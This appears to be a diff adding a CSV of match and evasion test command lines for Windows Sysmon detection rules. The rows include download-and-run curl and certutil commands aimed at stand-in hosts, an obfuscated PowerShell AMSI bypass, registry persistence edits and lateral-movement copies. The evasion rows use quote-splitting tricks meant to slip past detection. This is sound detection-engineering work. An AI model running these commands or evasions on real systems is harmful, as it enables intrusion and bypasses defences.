+win_spn_enum,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\setspn.exe"" /""q"" http/somename"
+win_spn_enum,Microsoft-Windows-Sysmon_1_Match_01.json,setspn -q foo/example.com
+win_spn_enum,Microsoft-Windows-Sysmon_1_Match_03.json,"""C:\Windows\System32\setspn.exe"" -q http/somename"
+win_spn_enum,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,setspn /q foo/example.com
+win_spn_enum,Microsoft-Windows-Sysmon_1_Match_02.json,C:\set_spn.exe -q */*server*
+win_susp_adfind,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"adfind -subnets -f (o""b""j""e""c""t""C""a""t""e""g""o""r""y=subnet)"
+win_susp_adfind,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Program Files\AdFind.exe -b DC=Contoso,DC=com -f ""object""category=person"" displayName -sl"
+win_susp_adfind,Microsoft-Windows-Sysmon_1_Match_01.json,adfind -h 172.16.0.2:389 -f objectcategory=organizationalUnit
+win_susp_adfind,Microsoft-Windows-Sysmon_1_Match_03.json,"C:\Program Files\AdFind.exe -b DC=Contoso,DC=com -f ""objectcategory=person"" displayName -sl"
+win_susp_adfind,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"adfind -h 172.16.0.2:389 -f ""object""category=organizationalUnit"
+win_susp_adfind,Microsoft-Windows-Sysmon_1_Match_02.json,adfind -subnets -f (objectCategory=subnet)
+win_susp_bcdedit,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"bcdedit.exe /del""""etevalue {default} safeboot"
+win_susp_bcdedit,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\bcdedit.exe"" /i""""m""""p""""o""""r""""t %TEMP%\default.bcd"
+win_susp_bcdedit,Microsoft-Windows-Sysmon_1_Match_01.json,bcdedit /delete {5cb10d44-20ee-11ea-85c6-e6e1f64324aa}
+win_susp_bcdedit,Microsoft-Windows-Sysmon_1_Match_03.json,"""C:\Windows\System32\bcdedit.exe"" /import %TEMP%\default.bcd"
+win_susp_bcdedit,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"bcdedit /del""ete"" {5cb10d44-20ee-11ea-85c6-e6e1f64324aa}"
+win_susp_bcdedit,Microsoft-Windows-Sysmon_1_Match_02.json,bcdedit.exe /deletevalue {default} safeboot
+win_susp_bginfo,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\Users\joe\Downloads\BGInfo\bginfo.exe /""popup"" /""nolicprompt"" %TEMP%\bginfo.bgi"
+win_susp_bginfo,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Users\Administrator\BGInfo.exe"" ""C:\Users\Administrator\bginfo.bgi"" -NOLICPROMPT -POPUP"
+win_susp_bginfo,Microsoft-Windows-Sysmon_1_Match_01.json,bginfo.exe /popup /nolicprompt info.bgi
+win_susp_bginfo,Microsoft-Windows-Sysmon_1_Match_03.json,"""C:\Users\Administrator\BGInfo.exe"" ""C:\Users\Administrator\bginfo.bgi"" /NOLICPROMPT /POPUP"
+win_susp_bginfo,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,bginfo.exe -popup -nolicprompt info.bgi
+win_susp_bginfo,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Users\joe\Downloads\BGInfo\bginfo.exe /popup /nolicprompt %TEMP%\bginfo.bgi
+win_susp_calc,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,calc evil1 evil2 evil3
+win_susp_calc,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Windows\System32\calc.exe"" more evil commandline arguments"
+win_susp_calc,Microsoft-Windows-Sysmon_1_Match_01.json,C:\Windows\System32\calc.exe evilargument
+win_susp_calc,Microsoft-Windows-Sysmon_1_Match_03.json,C:\calc.exe more evil commandline arguments
+win_susp_calc,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,calc.exe evilargument
+win_susp_calc,Microsoft-Windows-Sysmon_1_Match_04.json,C:\calc.exe
+win_susp_calc,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Windows\System32\calc.exe evil1 evil2 evil3
+win_susp_cdb,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"cdb.exe -""o"" calc.exe -""cf"" %TEMP%\malicious_script"
+win_susp_cdb,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe"" /""o"" ""C:\Windows\System32\ping.exe"" /""cf"" evilscript"
+win_susp_cdb,Microsoft-Windows-Sysmon_1_Match_01.json,cdb -cf foo -o notepad.exe
+win_susp_cdb,Microsoft-Windows-Sysmon_1_Match_03.json,"""C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe"" -o ""C:\Windows\System32\ping.exe"" -cf evilscript"
+win_susp_cdb,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,cdb /cf foo /o notepad.exe
+win_susp_cdb,Microsoft-Windows-Sysmon_1_Match_02.json,cdb.exe -o calc.exe -cf %TEMP%\malicious_script
+win_susp_certutil_command,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\Windows\System32\certutil.exe -verify""""ctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe"
+win_susp_certutil_command,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"certutil.exe ""-urlcache"" -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt"
+win_susp_certutil_command,Microsoft-Windows-Sysmon_1_Match_01.json,certutil /decode foo bar
+win_susp_certutil_command,Microsoft-Windows-Sysmon_1_Match_03.json,certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
+win_susp_certutil_command,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"certutil ""/decode"" foo bar"
+win_susp_certutil_command,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Windows\System32\certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
+win_susp_certutil_encode,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,C:\Windows\System32\certutil -encode -f %TEMP%\input output
+win_susp_certutil_encode,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,certutil.exe  -f -encode C:\Users\Administrator\Downloads\a.tmp C:\Users\Administrator\Downloads\b.tmp
+win_susp_certutil_encode,Microsoft-Windows-Sysmon_1_Match_01.json,certutil.exe -f -encode foo bar
+win_susp_certutil_encode,Microsoft-Windows-Sysmon_1_Match_03.json,certutil.exe -f -encode C:\Users\Administrator\Downloads\a.tmp C:\Users\Administrator\Downloads\b.tmp
+win_susp_certutil_encode,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"certutil.exe -f ""-encode"" foo bar"
+win_susp_certutil_encode,Microsoft-Windows-Sysmon_1_Match_02.json,certutil -encode -f %TEMP%\input output
+win_susp_cli_escape,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell -c invoke-webrequest -uri htt""p://www.google.de -outfile foo"
+win_susp_cli_escape,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"cmd /c ""certutil -verifyctl -f -split h^^^^^^^^^^^^^t^^^^^^^^^^^^6t^^^^^^^p://example.com/virus.exe"""
+win_susp_cli_escape,Microsoft-Windows-Sysmon_1_Match_01.json,powershell -c invoke-webrequest -uri h^t^t^p://www.google.de -outfile foo
+win_susp_cli_escape,Microsoft-Windows-Sysmon_1_Match_03.json,"cmd /c ""certutil -verifyctl -f -split h^t^t^p://example.com/virus.exe"""
+win_susp_cli_escape,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,powershell -c invoke-webrequest -uri h^t^tp://www.google.de -outfile foo
+win_susp_cli_escape,Microsoft-Windows-Sysmon_1_Match_02.json,"powershell -c invoke-webrequest -uri h""t""t""p://www.google.de -outfile foo"
+win_susp_codepage_switch,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,chcp.com 01258
+win_susp_codepage_switch,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""chcp""   936"
+win_susp_codepage_switch,Microsoft-Windows-Sysmon_1_Match_01.json,chcp 936
+win_susp_codepage_switch,Microsoft-Windows-Sysmon_1_Match_03.json,chcp   936
+win_susp_codepage_switch,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,C:\Windows\System32\chcp 936
+win_susp_codepage_switch,Microsoft-Windows-Sysmon_1_Match_02.json,chcp.com 1258
+win_susp_copy_lateral_movement,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,cmd.exe /c copy \\192.168.0.23\^c$\Users\ADMINI~1\AppData\Local\Temp\secret.zip D:\
+win_susp_copy_lateral_movement,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Windows\System32\cmd.exe /c ""copy"" \\server123\C$\Users\john\Downloads\Nuclear_Codes.docx C:\"
+win_susp_copy_lateral_movement,Microsoft-Windows-Sysmon_1_Match_01.json,cmd /c copy \\192.168.0.23\admin$\write.exe C:\Users\ADMINI~1\AppData\Local\Temp
+win_susp_copy_lateral_movement,Microsoft-Windows-Sysmon_1_Match_03.json,C:\Windows\System32\cmd.exe /c copy \\server123\C$\Users\john\Downloads\Nuclear_Codes.docx C:\
+win_susp_copy_lateral_movement,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"cmd /c copy \\192.168.0.23\admi""""$\write.exe C:\Users\ADMINI~1\AppData\Local\Temp"
+win_susp_copy_lateral_movement,Microsoft-Windows-Sysmon_1_Match_02.json,cmd.exe /c copy \\192.168.0.23\c$\Users\ADMINI~1\AppData\Local\Temp\secret.zip D:\
+win_susp_copy_system32,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\Windows\System32\cmd.exe /c copy C:\Windows\S""""y""""s""""t""""e""""m""""3""""2\certutil.exe C:\Users\john\AppData\Local\Temp\"
+win_susp_copy_system32,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"cmd.exe /c xcopy C:\Windows\S""""ystem32\certutil.exe C:\"
+win_susp_copy_system32,Microsoft-Windows-Sysmon_1_Match_01.json,cmd /c copy C:\Windows\System32\cmd.exe .
+win_susp_copy_system32,Microsoft-Windows-Sysmon_1_Match_03.json,cmd.exe /c xcopy C:\Windows\System32\certutil.exe C:\
+win_susp_copy_system32,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"cmd /c ""copy C:\Windows\System32\cmd.exe ."""
+win_susp_copy_system32,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Windows\System32\cmd.exe /c copy C:\Windows\System32\certutil.exe C:\Users\john\AppData\Local\Temp\
+win_susp_crackmapexec_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,powershell -noni -nop -w 1 -enc SQBFAFgAIABjAGEAbABjAC4AZQB4AGUA
+win_susp_crackmapexec_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\Windows\System32\powershell.exe ""-noni"" ""-nop"" ""-w"" 1 ""-enc"" JAB0ACAAPQAgACcAZABpAHIAJwA7AA0ACgAmACAAKAAnAEkAbgB2AG8AawBlACcAKwAnAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAnACkAIAAkAHQA"
+win_susp_crackmapexec_execution,Microsoft-Windows-Sysmon_1_Match_01.json,"powershell.exe -exec bypass -noni -nop -w 1 -C ""echo foo"""
+win_susp_crackmapexec_execution,Microsoft-Windows-Sysmon_1_Match_03.json,C:\Windows\System32\powershell.exe -noni -nop -w 1 -enc JAB0ACAAPQAgACcAZABpAHIAJwA7AA0ACgAmACAAKAAnAEkAbgB2AG8AawBlACcAKwAnAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAnACkAIAAkAHQA
+win_susp_crackmapexec_execution,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell.exe -w 1 -nop -noni -exec bypass -C ""echo foo"""
+win_susp_crackmapexec_execution,Microsoft-Windows-Sysmon_1_Match_02.json,powershell.exe -noni -nop -w 1 -enc SQBFAFgAIABjAGEAbABjAC4AZQB4AGUA
+win_susp_crackmapexec_powershell_obfuscation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"powershell  -exec bypass -noni -nop -w 1 -C "" & ( $SHellid[1]+$sHelLId[13]+'X')("" $( SV  'OFs'  '' ) ""+ [sTrING][CHaR[]](91 ,78 , 101, 116 , 46 ,83 , 101 , 114,118, 105 , 99, 101,80 ,111 ,105 , 110, 116,77 , 97,110,97 , 103 , 101 , 114,93,58 ,58,83,101, 114,118 , 101,114 ,67 ,101, 114,116, 105 , 102,105, 99,97,116,101 ,86, 97,108, 105 , 100 ,97 ,116 ,105 ,111, 110 ,67, 97, 108, 108, 98 , 97,99 , 107, 32,61,32,123,36,116 ,114,117 , 101 ,125,10,116, 114 ,121 , 123, 10,91, 82,101 , 102 ,93, 46,65,115 ,115 ,101 ,109 ,98, 108, 121 ,46,71 , 101, 116,84 , 121 ,112 , 101 ,40 , 39 , 83,121 , 115,39 , 43, 39 , 116, 101 , 109,46, 77, 97, 110 , 39 , 43 ,39 ,97,103,101 ,109,101,110,116 ,46 , 65 ,117, 116, 39 ,43,39,111, 109 , 97,116 , 105 ,111, 110,46, 65 ,109,39, 43,39, 115,105 , 85, 116, 39, 43, 39 ,105 ,108 , 115, 39 ,41 ,46 , 71 ,101 , 116,70 , 105 ,101,108 , 100, 40 , 39, 97, 109, 39, 43 , 39 ,115 ,105 ,73 , 110 ,105,39 , 43,39 ,116 ,70 ,97 , 105 , 108,101, 100 ,39,44,32 ,39 ,78 , 111 , 110 , 80,39, 43 ,39 ,117 ,98, 108,105,99, 44, 83,116,97,39,43,39,116 ,105, 99, 39, 41,46 ,83 , 101 ,116 , 86, 97 , 108, 117 ,101, 40, 36 ,110,117,108, 108,44 , 32, 36, 116 , 114 ,117 ,101,41, 10,125 , 99,97, 116 ,99, 104,123, 125 ,10,36 ,80 , 83 ,86, 101, 114 ,115 ,105 ,111, 110 , 84,97 , 98, 108,101 )+""$( sET-iTEm 'VaRiable:Ofs'  ' ')"" )"""
+win_susp_crackmapexec_powershell_obfuscation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"powershell.exe  -exec bypass -noni -nop -w 1 -C ""-jOin( '91}78The exclusive semaphore is owned by another process.%%116%%46>83~101m114X118>105_99~101>80&111>105X110X116~77&97X110Z97~103&101X114>93X58~58X83>101_114~118&101m114_67X101m114Z116m105~102&105m99Z97m116}101Z86X97~108~105%%100%%97}116_105%%111}110%%67m97X108%%108%%98m97%%99>107&32m61&32~123%%36&116~114~117&101~125_10_116m114Z121m123~10_91Z82}101}102m93}46&65~115&115Z101>109m98Z108_121Z46~71>101X116Z84}121_112m101%%40%%39%%83_121&115_39X43}39~116>101X109_46X77Z97Z110}39>43_39Z97~103~101}109>101&110>116}46&65~117_116}39~43~39}111~109>97~116Z105Z111X110X46m65}109X39&43~39_115>105~85m116~39Z43X39~105X108Z115Z39_41&46%%71~101}116~70~105~101X108%%100}40Z39~97&109>39X43>39~115m105X73X110X105>39Z43}39&116_70_97}105}108Z101m100X39&44m32}39&78%%111~110&80&39&43X39X117X98%%108~105~99_44~83_116m97Z39&43>39}116}105%%99%%39>41&46~83&101m116_86~97%%108&117~101}40&36~110~117m108&108Z44_32&36Z116}114&117X101&41Z10m125&99}97}116>99%%104_123}125_10}36m80~83_86>101&114~115X105&111>110X84&97&98}108Z101'.spl""""iT( '~_X}%%~mZ>&' )| foReAch{ ( [inT]$_ -aS[chAR]) }) |& ( $psHomE[4] + $PShoME[30]+'X')"" "
+win_susp_crackmapexec_powershell_obfuscation,Microsoft-Windows-Sysmon_1_Match_01.json,"powershell.exe  -exec bypass -noni -nop -w 1 -C ""('91Y78>101E116;46E83A101s114A118;105;99d101;80E111;105A110H116}77A97d110s97s103}101s114s93>58>58Y83H101s114s118H101Y114Y67Y101A114>116;105E102;105;99H97E116;101Y86A97}108}105H100s97H116;105H111Y110;67H97;108A108Y98E97H99>107Y32;61>32A123;36E116A114;117s101}125Y10A116}114;121s123d10s91A82d101;102Y93>46A65A115}115E101;109Y98H108Y121A46d71>101E116d84A121}112;101}40}39;83;121Y115;39s43}39;116E101H109Y46;77;97s110Y39;43Y39s97A103;101d109d101;110d116A46Y65d117Y116d39E43;39>111E109>97A116;105}111>110}46}65A109}39s43H39A115>105E85;116>39}43s39H105H108d115E39}41>46E71}101s116>70;105H101}108A100>40s39E97A109A39A43>39>115;105>73Y110E105;39>43A39;116A70}97Y105H108;101E100A39;44}32}39}78Y111H110s80;39Y43;39;117>98Y108;105;99>44s83;116d97d39E43>39;116}105H99A39;41s46Y83Y101>116E86Y97;108;117s101Y40d36A110d117d108A108E44s32;36A116Y114;117E101>41>10}125H99Y97H116H99H104s123}125}10Y36;80s83;86Y101H114;115d105}111Y110E84s97s98>108>101'.SPlIT('sY;AdE;}>H') | %% {([INt]$_-As[CHaR])}) -jOIN''| & ( ([stRiNG]$vErBoSEpREFEreNce)[1,3]+'x'-JOin'')"""
+win_susp_crackmapexec_powershell_obfuscation,Microsoft-Windows-Sysmon_1_Match_03.json,"powershell.exe  -exec bypass -noni -nop -w 1 -C ""-jOin( '91}78The exclusive semaphore is owned by another process.%%116%%46>83~101m114X118>105_99~101>80&111>105X110X116~77&97X110Z97~103&101X114>93X58~58X83>101_114~118&101m114_67X101m114Z116m105~102&105m99Z97m116}101Z86X97~108~105%%100%%97}116_105%%111}110%%67m97X108%%108%%98m97%%99>107&32m61&32~123%%36&116~114~117&101~125_10_116m114Z121m123~10_91Z82}101}102m93}46&65~115&115Z101>109m98Z108_121Z46~71>101X116Z84}121_112m101%%40%%39%%83_121&115_39X43}39~116>101X109_46X77Z97Z110}39>43_39Z97~103~101}109>101&110>116}46&65~117_116}39~43~39}111~109>97~116Z105Z111X110X46m65}109X39&43~39_115>105~85m116~39Z43X39~105X108Z115Z39_41&46%%71~101}116~70~105~101X108%%100}40Z39~97&109>39X43>39~115m105X73X110X105>39Z43}39&116_70_97}105}108Z101m100X39&44m32}39&78%%111~110&80&39&43X39X117X98%%108~105~99_44~83_116m97Z39&43>39}116}105%%99%%39>41&46~83&101m116_86~97%%108&117~101}40&36~110~117m108&108Z44_32&36Z116}114&117X101&41Z10m125&99}97}116>99%%104_123}125_10}36m80~83_86>101&114~115X105&111>110X84&97&98}108Z101'.spliT( '~_X}%%~mZ>&' )| foReAch{ ( [inT]$_ -aS[chAR]) }) |& ( $psHomE[4]+$PShoME[30]+'X')"" "
+win_susp_crackmapexec_powershell_obfuscation,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"powershell.exe  -exec bypass -noni -nop -w 1 -C ""('91Y78>101E116;46E83A101s114A118;105;99d101;80E111;105A110H116}77A97d110s97s103}101s114s93>58>58Y83H101s114s118H101Y114Y67Y101A114>116;105E102;105;99H97E116;101Y86A97}108}105H100s97H116;105H111Y110;67H97;108A108Y98E97H99>107Y32;61>32A123;36E116A114;117s101}125Y10A116}114;121s123d10s91A82d101;102Y93>46A65A115}115E101;109Y98H108Y121A46d71>101E116d84A121}112;101}40}39;83;121Y115;39s43}39;116E101H109Y46;77;97s110Y39;43Y39s97A103;101d109d101;110d116A46Y65d117Y116d39E43;39>111E109>97A116;105}111>110}46}65A109}39s43H39A115>105E85;116>39}43s39H105H108d115E39}41>46E71}101s116>70;105H101}108A100>40s39E97A109A39A43>39>115;105>73Y110E105;39>43A39;116A70}97Y105H108;101E100A39;44}32}39}78Y111H110s80;39Y43;39;117>98Y108;105;99>44s83;116d97d39E43>39;116}105H99A39;41s46Y83Y101>116E86Y97;108;117s101Y40d36A110d117d108A108E44s32;36A116Y114;117E101>41>10}125H99Y97H116H99H104s123}125}10Y36;80s83;86Y101H114;115d105}111Y110E84s97s98>108>101'.SPlIT('sY;AdE;}>H') | %% {([INt]$_-As[CHaR])}) -jOIN''| & ( ([stRiNG]$vErBoSEpREFEreNce)[1,3] + 'x'-JOin'')"""
+win_susp_crackmapexec_powershell_obfuscation,Microsoft-Windows-Sysmon_1_Match_02.json,"powershell.exe  -exec bypass -noni -nop -w 1 -C "" & ( $SHellid[1]+$sHelLId[13]+'X')("" $( SV  'OFs'  '' ) ""+ [sTrING][CHaR[]](91 ,78 , 101, 116 , 46 ,83 , 101 , 114,118, 105 , 99, 101,80 ,111 ,105 , 110, 116,77 , 97,110,97 , 103 , 101 , 114,93,58 ,58,83,101, 114,118 , 101,114 ,67 ,101, 114,116, 105 , 102,105, 99,97,116,101 ,86, 97,108, 105 , 100 ,97 ,116 ,105 ,111, 110 ,67, 97, 108, 108, 98 , 97,99 , 107, 32,61,32,123,36,116 ,114,117 , 101 ,125,10,116, 114 ,121 , 123, 10,91, 82,101 , 102 ,93, 46,65,115 ,115 ,101 ,109 ,98, 108, 121 ,46,71 , 101, 116,84 , 121 ,112 , 101 ,40 , 39 , 83,121 , 115,39 , 43, 39 , 116, 101 , 109,46, 77, 97, 110 , 39 , 43 ,39 ,97,103,101 ,109,101,110,116 ,46 , 65 ,117, 116, 39 ,43,39,111, 109 , 97,116 , 105 ,111, 110,46, 65 ,109,39, 43,39, 115,105 , 85, 116, 39, 43, 39 ,105 ,108 , 115, 39 ,41 ,46 , 71 ,101 , 116,70 , 105 ,101,108 , 100, 40 , 39, 97, 109, 39, 43 , 39 ,115 ,105 ,73 , 110 ,105,39 , 43,39 ,116 ,70 ,97 , 105 , 108,101, 100 ,39,44,32 ,39 ,78 , 111 , 110 , 80,39, 43 ,39 ,117 ,98, 108,105,99, 44, 83,116,97,39,43,39,116 ,105, 99, 39, 41,46 ,83 , 101 ,116 , 86, 97 , 108, 117 ,101, 40, 36 ,110,117,108, 108,44 , 32, 36, 116 , 114 ,117 ,101,41, 10,125 , 99,97, 116 ,99, 104,123, 125 ,10,36 ,80 , 83 ,86, 101, 114 ,115 ,105 ,111, 110 , 84,97 , 98, 108,101 )+""$( sET-iTEm 'VaRiable:Ofs'  ' ')"" )"""
+win_susp_csc_folder,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /noconfig /fullpaths @""C:\Windows\T""""emp\-dcx32-8.cmdline"""
+win_susp_csc_folder,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"csc /noconfig /fullpaths @""C:\Users\john\App""Data\Local\Temp\foo"""
+win_susp_csc_folder,Microsoft-Windows-Sysmon_1_Match_01.json,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /noconfig /fullpaths @""C:\Users\admin\AppData\Local\Temp\-dcx32-8.cmdline"""
+win_susp_csc_folder,Microsoft-Windows-Sysmon_1_Match_03.json,"csc /noconfig /fullpaths @""C:\Users\john\AppData\Local\Temp\foo"""
+win_susp_csc_folder,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /noconfig /fullpaths @""C:\Users\admin\App""""Data\Local\Temp\-dcx32-8.cmdline"""
+win_susp_csc_folder,Microsoft-Windows-Sysmon_1_Match_02.json,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /noconfig /fullpaths @""C:\Windows\Temp\-dcx32-8.cmdline"""
+win_susp_curl_download,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,C:\Users\joe\AppData\Local\Temp\curl.exe -Os http://ashadysite.com/32498349863469.exe & start 32498349863469.exe
+win_susp_curl_download,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"C:\curl ""-O"" http://172.16.0.123/very_funny.scr & start very_funny.scr"
+win_susp_curl_download,Microsoft-Windows-Sysmon_1_Match_01.json,curl -O http://192.168.191.1/shell191.exe & start shell191.exe
+win_susp_curl_download,Microsoft-Windows-Sysmon_1_Match_03.json,C:\curl -O http://172.16.0.123/very_funny.scr & start very_funny.scr
+win_susp_curl_download,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,curl --remote-name http://192.168.191.1/shell191.exe & start shell191.exe
+win_susp_curl_download,Microsoft-Windows-Sysmon_1_Match_02.json,C:\Users\joe\AppData\Local\Temp\curl.exe -O http://ashadysite.com/32498349863469.exe & start 32498349863469.exe
+win_susp_curl_fileupload,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"curl.exe -""""F file=C:\\upload\\this\\file.txt http://remote/server"""
+win_susp_curl_fileupload,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"curl ""-F"" myfile.txt 127.0.0.1:88"
+win_susp_curl_fileupload,Microsoft-Windows-Sysmon_1_Match_01.json,curl -F file=upload_file.txt http://127.0.0.1/upload
+win_susp_curl_fileupload,Microsoft-Windows-Sysmon_1_Match_03.json,curl -F myfile.txt 127.0.0.1:88
+win_susp_curl_fileupload,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"curl -""F"" file=upload_file.txt http://127.0.0.1/upload"
+win_susp_curl_fileupload,Microsoft-Windows-Sysmon_1_Match_02.json,curl.exe -F file=C:\upload\this\file.txt http://remote/server
+win_susp_curl_start_combo,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"cu""""rl.exe -O http://remote.server/malicious.exe & start malicious.exe"
+win_susp_curl_start_combo,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""cu""rl.exe -O http://this.is.fine/nothing_to_see.exe & start nothing_to_see.exe"
+win_susp_curl_start_combo,Microsoft-Windows-Sysmon_1_Match_01.json,curl -O http://192.168.191.1/shell191.exe & start shell191.exe
+win_susp_curl_start_combo,Microsoft-Windows-Sysmon_1_Match_03.json,curl.exe -O http://this.is.fine/nothing_to_see.exe & start nothing_to_see.exe
+win_susp_curl_start_combo,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"c""ur""l -O http://192.168.191.1/shell191.exe & start shell191.exe"
+win_susp_curl_start_combo,Microsoft-Windows-Sysmon_1_Match_02.json,curl.exe -O http://remote.server/malicious.exe & start malicious.exe
+win_susp_desktopimgdownldr,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://download.bad/mal.exe /eventName:desktopimgdownldr && echo ""print .jpg to avoid detection"""
+win_susp_desktopimgdownldr,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"r""e""g.exe     de""""le""te"" HKLM\Software\Microsoft\Windows\CurrentVersion\Person""""aliz""atio""nCSP"
+win_susp_desktopimgdownldr,Microsoft-Windows-Sysmon_1_Match_01.json,"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://www.bundesgesundheitsministerium.de/fileadmin/Dateien/3_Downloads/C/Coronavirus/Verordnungen/CoronaImpfV_BAnz_AT_08.02.2021_V1.pdf /eventName:desktopimgdownldr"
+win_susp_desktopimgdownldr,Microsoft-Windows-Sysmon_1_Match_03.json,reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\PersonalizationCSP
+win_susp_desktopimgdownldr,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lock""""sc""reen""url:https://www.bundesgesundheitsministerium.de/fileadmin/Dateien/3_Downloads/C/Coronavirus/Verordnungen/CoronaImpfV_BAnz_AT_08.02.2021_V1.pdf /eventName:desktopimgdownldr"
+win_susp_desktopimgdownldr,Microsoft-Windows-Sysmon_1_Match_02.json,"set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://download.bad/mal.exe /eventName:desktopimgdownldr"
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"reg a""""dd HKLM\software\Microsoft\Windows\CurrentVersion\Ru""nOn""ce"
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Match_09.json,reg add HKLM\software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"reg ad""""d \so""ftware\Micros""oft\Windows\CurrentVersion\Ru""nOn""ce""E""x"
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"reg add HKLM\sof""tware\Micro""soft\Windows NT\CurrentVersion\Win""logon\User""init"
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"reg ""a""dd HKLM\software\Microsoft\Win""dows\CurrentVersion\Ru""nServices"
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_10.json,"reg add HKLM\system\CurrentControlSet\Control\SafeB""oot\Alter""nateShell"
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Match_01.json,reg add HKLM\software\Microsoft\Windows\CurrentVersion\Run
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Match_03.json,reg add \software\Microsoft\Windows\CurrentVersion\RunOnceEx
+win_susp_direct_asep_reg_keys_modification,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"reg a""dd"" HKLM\so""ftw""are\Mi""cro""soft\Win""dow""s\Curr""ent""Version\Run"
